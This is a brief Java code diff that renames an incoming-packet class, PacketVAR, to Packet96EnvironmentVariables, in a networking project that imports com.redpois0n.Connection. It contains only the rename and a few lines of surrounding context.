@@ -5,7 +5,7 @@ import java.util.Set;
 import com.redpois0n.Connection;
 
 
-public class PacketVAR extends AbstractIncomingPacket {
+public class Packet96EnvironmentVariables extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
